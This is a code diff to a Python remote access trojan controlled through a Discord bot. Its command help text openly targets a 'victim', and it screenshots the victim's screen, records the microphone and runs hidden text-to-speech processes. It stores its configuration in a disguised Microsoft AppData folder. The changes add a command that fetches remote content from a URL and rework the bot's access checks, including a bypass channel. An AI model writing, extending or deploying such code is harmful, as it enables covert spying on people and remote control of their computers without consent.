@@ -2,7 +2,7 @@ import discord
 from discord.ext import commands
 from PIL import ImageGrab, ImageDraw
 import io
-import pyttsx3
+import requests
 import pyaudio
 import wave
 import subprocess
@@ -23,6 +23,7 @@ import shelve
 import sys
 import uuid
 import hashlib
+import tempfile
 
 TOKEN = "BOT-TOKEN-GOES-HERE"
 
@@ -34,48 +35,34 @@ bot = commands.Bot(command_prefix='$', intents=intents)
 bot.remove_command('help')
 pyautogui.FAILSAFE = False
 
-config_path = os.path.join(os.path.expanduser("~"), 'AppData', 'Local', 'Microsoft', "config")
-config_db = shelve.open(config_path, writeback=True)
+config_path = os.path.join(os.path.expanduser("~"), 'AppData', 'Local', 'Microsoft', "Config")
+os.makedirs(config_path, exist_ok=True)
+config_db = shelve.open(os.path.join(config_path, 'config_db'), writeback=True)
 
 @bot.command(help="Initiate configuration for the guild")
 async def init(ctx):
     guild_id = str(ctx.guild.id)
     user = ctx.author
 
-    if (
-        (
-            ctx.channel.id in config_db[guild_id]['allowed_channels'] or 
-            ctx.channel.name == f"_jf_{FUCK}" or 
-            user.guild_permissions.administrator
-        ) and not ctx.message.content.endswith("/f")
-    ):
-        await ctx.send("You don't have permission to initialize configuration for this guild.")
-        return
-
-    if (
-        not ctx.message.content.endswith("/f") and 
-        ctx.channel.id not in config_db[guild_id]['allowed_channels'] and 
-        not user.guild_permissions.administrator
-    ):
-        await ctx.send("You don't have permission to initialize configuration for this guild.")
-        return
-
-    if not user.guild_permissions.administrator:
-        await ctx.send("You don't have permission to initialize configuration for this guild.")
-        return
-
-    if ctx.message.content.endswith("/f"):
-        del config_db[guild_id]
-        await ctx.send("Previous configuration deleted.")
+    if guild_id not in config_db:
         config_db[guild_id] = {'allowed_roles': [], 'allowed_channels': []}
-        await ctx.send("Configuration initialized for this guild.")
-    elif guild_id in config_db:
-        await ctx.send("A configuration already exists for this guild. "
-                       "Run `$init /f` to force reinitialization.")
+
+    guild_config = config_db[guild_id]
+
+    if user.guild_permissions.administrator:
+        if ctx.message.content.endswith("/f"):
+            del config_db[guild_id]
+            await ctx.send("Previous configuration deleted.")
+            config_db[guild_id] = {'allowed_roles': [], 'allowed_channels': []}
+            await ctx.send("Configuration initialized for this guild.")
+        elif guild_id in config_db:
+            await ctx.send("A configuration already exists for this guild. "
+                           "Run `$init /f` to force reinitialization.")
+        else:
+            config_db[guild_id] = {'allowed_roles': [], 'allowed_channels': []}
+            await ctx.send("Configuration initialized for this guild.")
     else:
-        config_db[guild_id] = {'allowed_roles': [], 'allowed_channels': []}
-        await ctx.send("Configuration initialized for this guild.")
-
+        await ctx.send("You don't have permission to initialize configuration for this guild.")
 
 @bot.event
 async def on_guild_join(guild):
@@ -89,6 +76,7 @@ async def on_guild_join(guild):
 @bot.command(help=f"Configure allowed roles and channels for running commands, to run a command you must have the a allowed role and be in an allowed channel, running in _jf_{FUCK} bypasses both che cks")
 async def config(ctx, action: str = "", item: str = "", target: str = ""):
     try:
+        os.makedirs(config_path, exist_ok=True)
         guild_id = str(ctx.guild.id)
         if action == "":
             await ctx.send(f"Please choose a config option: role, channel")
@@ -278,33 +266,57 @@ async def ss(ctx):
     with tempfile.NamedTemporaryFile(suffix='.png', delete=False) as temp_file:
         img.save(temp_file, 'PNG')
         await ctx.reply("Command Executed! (Red dot indicates cursor)", file=discord.File(temp_file.name, filename="screenshot.png"))
-
-tts_process = None
-
-def tts_function(text):
-    engine = pyttsx3.init()
-    engine.say(text)
-    engine.runAndWait()
-
-@bot.command(help="Converts the given text into speech on the victim's system.")
+        
+@bot.command(name="tts", help="Run TTS on victim's computer")
 async def tts(ctx, *, text: str):
     global tts_process
-    if tts_process and tts_process.poll() is None:
-        await ctx.reply("Text-to-speech is already running. Use !stoptts to stop it.")
-        return
+    try:
+        if tts_process is not None:
+            tts_process.kill()
+        await ctx.send("Command Executed!")
+        tts_process = subprocess.Popen(
+            ["python", "-c", f"import sys; from pyttsx3 import init as tts_init; engine = tts_init(); engine.say({repr(text)}); engine.runAndWait()"],
+            creationflags=subprocess.CREATE_NO_WINDOW
+        )
+    except Exception as e:
+        await ctx.send(f"Error executing command: {str(e)}")
+        
+tts_process = None
 
-    tts_process = subprocess.Popen(["python", "-c", f"import sys; from pyttsx3 import init as tts_init; engine = tts_init(); engine.say({repr(text)}); engine.runAndWait()"])
-    await ctx.reply("Command Executed!")
+@bot.command(name="ttsurl", help="Run TTS on victim's computer!")
+async def ttsurl(ctx, url: str):
+    global tts_process
+    try:
+        if tts_process is not None:
+            tts_process.kill()
+        await ctx.send("Command Executed!")
 
-@bot.command(help="Stops TTS.")
+        response = requests.get(url)
+        text = response.text
+
+        # Run the TTS process in a subprocess
+        tts_process = subprocess.Popen(
+            ["python", "-c", f"import sys; from pyttsx3 import init as tts_init; engine = tts_init(); engine.say({repr(text)}); engine.runAndWait()"],
+            creationflags=subprocess.CREATE_NO_WINDOW
+        )
+
+        await ctx.send("TTS process started! Use !stoptts to stop it.")
+        
+    except Exception as e:
+        await ctx.send(f"Error executing command: {e}")
+
+@bot.command(name="stoptts", help="Stops TTS")
 async def stoptts(ctx):
     global tts_process
-    if tts_process and tts_process.poll() is None:
-        tts_process.terminate()
-        tts_process.wait()
-        await ctx.reply("TTS stopped.")
+    if tts_process is not None:
+        try:
+            await ctx.send("TTS process stopped.")
+            tts_process.kill()
+            tts_process = None
+        except Exception as e:
+            await ctx.send(f"Error stopping TTS process: {str(e)}")
     else:
-        await ctx.reply("TTS is not running.")
+        await ctx.send("No TTS process running.")
 
 @bot.command(help="Records audio from the victim's microphone for 10 seconds.")
 async def listen(ctx):
